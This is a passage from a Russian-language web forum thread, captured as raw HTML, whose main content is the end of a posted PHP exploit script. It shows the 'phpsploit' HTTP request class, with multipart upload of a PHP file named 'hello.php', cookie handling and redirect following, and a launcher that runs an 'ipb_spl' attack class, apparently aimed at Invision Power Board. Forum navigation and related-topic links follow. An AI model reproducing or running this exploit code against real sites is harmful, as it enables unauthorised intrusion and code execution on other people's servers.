/>&nbsp; &nbsp; * packet with the POST method using<br />&nbsp; &nbsp; * the multipart/form-data enctype.<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;array array FormDataArray<br />&nbsp; &nbsp; * @return&nbsp; string $this-&gt;sock&#40;&#41;<br />&nbsp; &nbsp; * @example $formdata = array&#40;<br />&nbsp; &nbsp; *&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; frmdt_url =&gt; 'http://localhost/upload.php',<br />&nbsp; &nbsp; *&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; frmdt_boundary =&gt; '123456', # Optional<br />&nbsp; &nbsp; *&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'var' =&gt; 'example',<br />&nbsp; &nbsp; *&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'file' =&gt; array&#40;<br />&nbsp; &nbsp; *&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; frmdt_type =&gt; 'image/gif',&nbsp; # Optional<br />&nbsp; &nbsp; *&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; frmdt_transfert =&gt; 'binary' # Optional<br />&nbsp; &nbsp; *&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; frmdt_filename =&gt; 'hello.php,<br />&nbsp; &nbsp; *&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; frmdt_content =&gt; '&lt;?php echo 1; ?&gt;'&#41;&#41;;<br />&nbsp; &nbsp; *&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $this-&gt;formdata&#40;$formdata&#41;;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function formdata&#40;$array&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;target&#40;$array&#91;frmdt_url&#93;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;method = 'formdata';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data = '';<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!isset&#40;$array&#91;frmdt_boundary&#93;&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;boundary = 'phpsploit';<br />&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;boundary = $array&#91;frmdt_boundary&#93;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;foreach&#40;$array as $key =&gt; $value&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!preg_match&#40;'#^frmdt_&#40;boundary|url&#41;#',$key&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data .= str_repeat&#40;'-',29&#41;.$this-&gt;boundary.&quot;\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data .= 'Content-Disposition: form-data; name=&quot;'.$key.'&quot;;';<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!is_array&#40;$value&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data .= &quot;\r\n\r\n&quot;.$value.&quot;\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data .= ' filename=&quot;'.$array&#91;$key&#93;&#91;frmdt_filename&#93;.&quot;\&quot;;\r\n&quot;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40;isset&#40;$array&#91;$key&#93;&#91;frmdt_type&#93;&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data .= 'Content-Type: '.$array&#91;$key&#93;&#91;frmdt_type&#93;.&quot;\r\n&quot;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40;isset&#40;$array&#91;$key&#93;&#91;frmdt_transfert&#93;&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data .= 'Content-Transfer-Encoding: '.$array&#91;$key&#93;&#91;frmdt_transfert&#93;.&quot;\r\n&quot;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data .= &quot;\r\n&quot;.$array&#91;$key&#93;&#91;frmdt_content&#93;.&quot;\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data .= str_repeat&#40;'-',29&#41;.$this-&gt;boundary.&quot;--\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;sock&#40;&#41;;<br />&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;<br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function returns the content<br />&nbsp; &nbsp; * of the server response, without<br />&nbsp; &nbsp; * the headers.<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;string code ServerResponse<br />&nbsp; &nbsp; * @return&nbsp; string $this-&gt;server_content<br />&nbsp; &nbsp; * @example $this-&gt;getcontent&#40;&#41;<br />&nbsp; &nbsp; * @example $this-&gt;getcontent&#40;$this-&gt;get&#40;'http://localhost/'&#41;&#41;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function getcontent&#40;$code=''&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;empty&#40;$code&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$code = $this-&gt;recv;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;$code = explode&#40;&quot;\r\n\r\n&quot;,$code&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;server_content = '';<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;for&#40;$i=1;$i&lt;count&#40;$code&#41;;$i++&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;server_content .= $code&#91;$i&#93;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;server_content;<br />&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;<br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function returns the headers<br />&nbsp; &nbsp; * of the server response, without<br />&nbsp; &nbsp; * the content.<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;string code ServerResponse<br />&nbsp; &nbsp; * @return&nbsp; string $this-&gt;server_header<br />&nbsp; &nbsp; * @example $this-&gt;getcontent&#40;&#41;<br />&nbsp; &nbsp; * @example $this-&gt;getcontent&#40;$this-&gt;post&#40;'http://localhost/','1=2'&#41;&#41;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function getheader&#40;$code=''&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;empty&#40;$code&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$code = $this-&gt;recv;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;$code = explode&#40;&quot;\r\n\r\n&quot;,$code&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;server_header = $code&#91;0&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;server_header;<br />&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;<br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function is called by the<br />&nbsp; &nbsp; * cookiejar&#40;&#41; function. It adds the<br />&nbsp; &nbsp; * value of the &quot;Set-Cookie&quot; header<br />&nbsp; &nbsp; * in the &quot;Cookie&quot; header for the<br />&nbsp; &nbsp; * next request. You don't have to<br />&nbsp; &nbsp; * call it.<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; * @access private<br />&nbsp; &nbsp; * @param&nbsp; string code ServerResponse<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function getcookie&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;foreach&#40;explode&#40;&quot;\r\n&quot;,$this-&gt;getheader&#40;&#41;&#41; as $header&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40;preg_match&#40;'/set-cookie/i',$header&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$fequal = strpos&#40;$header,'='&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$fvirgu = strpos&#40;$header,';'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;// 12=strlen&#40;'set-cookie: '&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$cname&nbsp; = substr&#40;$header,12,$fequal-12&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$cvalu&nbsp; = substr&#40;$header,$fequal+1,$fvirgu-&#40;strlen&#40;$cname&#41;+12+1&#41;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;cookie&#91;trim&#40;$cname&#41;&#93; = trim&#40;$cvalu&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&#125;<br /><br /><br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function is called by the<br />&nbsp; &nbsp; * get&#40;&#41;/post&#40;&#41; functions. You<br />&nbsp; &nbsp; * don't have to call it.<br />&nbsp; &nbsp; *<br />&nbsp; &nbsp; * @access&nbsp; private<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;string urltarg Url<br />&nbsp; &nbsp; * @example $this-&gt;target&#40;'http://localhost/'&#41;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function target&#40;$urltarg&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!ereg&#40;'^http://',$urltarg&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$urltarg = 'http://'.$urltarg;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$urlarr = parse_url&#40;$urltarg&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!isset&#40;$urlarr&#91;'path'&#93;&#41; || empty&#40;$urlarr&#91;'path'&#93;&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;die&#40;&quot;Error: No path precised&quot;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;url&nbsp; = $urlarr&#91;'path'&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;isset&#40;$urlarr&#91;'query'&#93;&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;url .= '?'.$urlarr&#91;'query'&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;port = !empty&#40;$urlarr&#91;'port'&#93;&#41; ? $urlarr&#91;'port'&#93; : 80;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;host = $urlarr&#91;'host'&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;$this-&gt;port != '80'&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;host .= ':'.$this-&gt;port;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;path = substr&#40;$urlarr&#91;'path'&#93;,0,strrpos&#40;$urlarr&#91;'path'&#93;,'/'&#41;+1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;$this-&gt;port &gt; 65535&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;die&#40;&quot;Error: Invalid port number&quot;&#41;;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * If you call this function,<br />&nbsp; &nbsp; * the script will extract all<br />&nbsp; &nbsp; * 'Set-Cookie' headers values<br />&nbsp; &nbsp; * and it will automatically add<br />&nbsp; &nbsp; * them into the 'Cookie' header<br />&nbsp; &nbsp; * for all next requests.<br />&nbsp; &nbsp; *<br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;integer code 1&#40;enabled&#41; 0&#40;disabled&#41;<br />&nbsp; &nbsp; * @example $this-&gt;cookiejar&#40;0&#41;<br />&nbsp; &nbsp; * @example $this-&gt;cookiejar&#40;1&#41;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function cookiejar&#40;$code&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;$code=='0'&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;cookiejar=FALSE;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;elseif&#40;$code=='1'&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;cookiejar=TRUE;<br />&nbsp; &nbsp;&#125;<br /><br /><br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * If you call this function,<br />&nbsp; &nbsp; * the script will follow all<br />&nbsp; &nbsp; * redirections sent by the server.<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;integer code 1&#40;enabled&#41; 0&#40;disabled&#41;<br />&nbsp; &nbsp; * @example $this-&gt;allowredirection&#40;0&#41;<br />&nbsp; &nbsp; * @example $this-&gt;allowredirection&#40;1&#41;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function allowredirection&#40;$code&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;$code=='0'&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;allowredirection=FALSE;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;elseif&#40;$code=='1'&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;allowredirection=TRUE;<br />&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;<br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function is called if<br />&nbsp; &nbsp; * allowredirection&#40;&#41; is enabled.<br />&nbsp; &nbsp; * You don't have to call it.<br />&nbsp; &nbsp; *<br />&nbsp; &nbsp; * @access private<br />&nbsp; &nbsp; * @return string $this-&gt;get&#40;'http://'.$this-&gt;host.$this-&gt;path.$this-&gt;last_redirection&#41;<br />&nbsp; &nbsp; * @return string $this-&gt;get&#40;$this-&gt;last_redirection&#41;<br />&nbsp; &nbsp; * @return string $this-&gt;recv;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function getredirection&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;preg_match&#40;'/&#40;location|content-location|uri&#41;: &#40;.*&#41;/i',$this-&gt;getheader&#40;&#41;,$codearr&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;last_redirection = trim&#40;$codearr&#91;2&#93;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!ereg&#40;'://',$this-&gt;last_redirection&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;get&#40;'http://'.$this-&gt;host.$this-&gt;path.$this-&gt;last_redirection&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;get&#40;$this-&gt;last_redirection&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;recv;<br />&nbsp; &nbsp;&#125;<br /><br /><br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function allows you<br />&nbsp; &nbsp; * to reset some parameters.<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;string func Param<br />&nbsp; &nbsp; * @example $this-&gt;reset&#40;'header'&#41;<br />&nbsp; &nbsp; * @example $this-&gt;reset&#40;'cookie'&#41;<br />&nbsp; &nbsp; * @example $this-&gt;reset&#40;&#41;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function reset&#40;$func=''&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;switch&#40;$func&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;case 'header':<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;header = array&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;break;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;case 'cookie':<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;cookie = array&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;break;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;default:<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;cookiejar = '';<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;header = array&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;cookie = array&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;allowredirection = '';<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;break;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&#125;<br />&#125;<br /><br />$web = new phpsploit;<br />$web-&gt;cookiejar&#40;1&#41;;<br />$web-&gt;agent&#40;'Mozilla Firefox'&#41;;<br /><br />$ipb = new ipb_spl;<br />$ipb-&gt;web =&amp; $web;<br />$ipb-&gt;main&#40;&#41;;<br /><br />?&gt;<br /><br /></code></dd></dl></div>
</div>
<dl class="postprofile" id="profile63322"><dt><span style="font-size: 1.1em;"><a href="./memberlist.php?mode=viewprofile&amp;u=895&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #0000a0;" class="username-coloured">divir</a></span></dt><dd>unknown_user</dd><dd><img src="./images/ranks/r15.gif" alt="unknown_user" title="unknown_user" /></dd><dd><strong>Откуда:</strong> 127.0.0.1</dd><dd><strong>Сообщения:</strong> 691</dd>
</dl>
<div class="back2top"><a href="#wrap" class="top" title="Вернуться к началу">Вернуться к началу</a></div>
<span class="corners-bottom"><span></span></span></div></div>
<hr class="divider" /><form id="viewtopic" method="post" action="./viewtopic.php?f=50&amp;t=2398&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a">
<fieldset class="display-options" style="margin-top: 0; "><a href="./viewtopic.php?f=50&amp;t=2398&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a&amp;start=10" class="right-box right">След.</a><label>Показать сообщения за: <select name="st" id="st"><option value="0" selected="selected">Все сообщения</option><option value="1">1 день</option><option value="7">7 дней</option><option value="14">2 недели</option><option value="30">1 месяц</option><option value="90">3 месяца</option><option value="180">6 месяцев</option><option value="365">1 год</option></select></label><label>Поле сортировки <select name="sk" id="sk"><option value="a">Автор</option><option value="t" selected="selected">Время размещения</option><option value="s">Заголовок</option></select></label> <label><select name="sd" id="sd"><option value="a" selected="selected">по возрастанию</option><option value="d">по убыванию</option></select> <input type="submit" name="sort" value="Перейти" class="button2" /></label></fieldset>
</form><hr />
<div class="topic-actions"><div class="buttons"><div class="reply-icon"><a href="./posting.php?mode=reply&amp;f=50&amp;t=2398&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" title="Ответить"><span></span>Ответить</a></div></div>
<div class="pagination">Сообщений: 12
 &bull; <a href="#" onclick="jumpto(); return false;" title="Перейти на страницу…">Страница 1 из 2</a> &bull; <span><strong>1</strong><span class="page-sep">, </span><a href="./viewtopic.php?f=50&amp;t=2398&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a&amp;start=10">2</a></span></div></div>
<div class="forumbg"><div class="inner"><span class="corners-top"><span></span></span><ul class="topiclist"><li class="header"><dl class="icon"><dt>﻿Похожие темы</dt><dd class="posts">Ответы</dd><dd class="views">Просмотры</dd><dd class="lastpost"><span>Последнее сообщение</span></dd></dl></li></ul><ul class="topiclist topics"><li class="row bg1"><dl class="icon" style="background-image: url(./styles/prosilver/imageset/topic_read_hot.gif); background-repeat: no-repeat;"><dt ><a href="viewtopic.php?f=16&amp;t=5574&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" class="topictitle" onclick="window.open(this.href);return false;">3 года в эфире. День рождения МегаОбзора и Полезного форума</a><br /><strong class="pagination"><span><a href="viewtopic.php?f=16&amp;t=5574&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a">1</a><span class="page-sep">, </span><a href="viewtopic.php?f=16&amp;t=5574&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a&amp;start=10">2</a><span class="page-sep">, </span><a href="viewtopic.php?f=16&amp;t=5574&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a&amp;start=20">3</a><span class="page-sep">, </span><a href="viewtopic.php?f=16&amp;t=5574&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a&amp;start=30">4</a></span></strong> <a href="memberlist.php?mode=viewprofile&amp;u=5961&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" onclick="window.open(this.href);return false;"><span style="color: #6600FF;" class="username-coloured">V.A.N.O.</span></a> в форуме <a href="viewforum.php?f=16&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" onclick="window.open(this.href);return false;">Работа Mega Obzor и Полезного форума</a></dt><dd class="posts">37</dd><dd class="views">7310</dd><dd class="lastpost"><span> <a href="memberlist.php?mode=viewprofile&amp;u=10995&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" onclick="window.open(this.href);return false;">alexys</a><a href="viewtopic.php?p=82483&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a#p82483" onclick="window.open(this.href);return false;"><img src="./styles/prosilver/imageset/icon_topic_latest.gif" width="11" height="9" alt="Перейти к последнему сообщению" title="Перейти к последнему сообщению" /></a> <br /> 24 фев 2009 12:32<br /> </span></dd></dl></li><li class="row bg2"><dl class="icon" style="background-image: url(./styles/prosilver/imageset/topic_read.gif); background-repeat: no-repeat;"><dt ><a href="viewtopic.php?f=36&amp;t=10356&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" class="topictitle" onclick="window.open(this.href);return false;">Красивый блок навигации для форума или портала на phpBB3</a><br /> <a href="memberlist.php?mode=viewprofile&amp;u=34654&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" onclick="window.open(this.href);return false;">PATAP</a> в форуме <a href="viewforum.php?f=36&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" onclick="window.open(this.href);return false;">Создание сайтов от А до Я</a></dt><dd class="posts">2</dd><dd class="views">208</dd><dd class="lastpost"><span> <a href="memberlist.php?mode=viewprofile&amp;u=34654&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" onclick="window.open(this.href);return false;">PATAP</a><a href="viewtopic.php?p=124228&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a#p124228" onclick="window.open(this.href);return false;"><img src="./styles/prosilver/imageset/icon_topic_latest.gif" width="11" height="9" alt="Перейти к последнему сообщению" title="Перейти к последнему сообщению" /></a> <br /> 11 дек 2011 23:03<br /> </span></dd></dl></li><li class="row bg1"><dl class="icon" style="background-image: url(./styles/prosilver/imageset/topic_read_hot.gif); background-repeat: no-repeat;"><dt ><a href="viewtopic.php?f=16&amp;t=4474&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" class="topictitle" onclick="window.open(this.href);return false;">Созданы разделы для мужской и женской части форума</a><br /><strong class="pagination"><span><a href="viewtopic.php?f=16&amp;t=4474&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a">1</a><span class="page-sep">, </span><a href="viewtopic.php?f=16&amp;t=4474&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a&amp;start=10">2</a><span class="page-sep">, </span><a href="viewtopic.php?f=16&amp;t=4474&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a&amp;start=20">3</a></span></strong> <a href="memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" onclick="window.open(this.href);return false;"><span style="color: #ff8000;" class="username-coloured">Lenar</span></a> в форуме <a href="viewforum.php?f=16&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" onclick="window.open(this.href);return false;">Работа Mega Obzor и Полезного форума</a></dt><dd class="posts">20</dd><dd class="views">4833</dd><dd class="lastpost"><span> <a href="memberlist.php?mode=viewprofile&amp;u=5380&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" 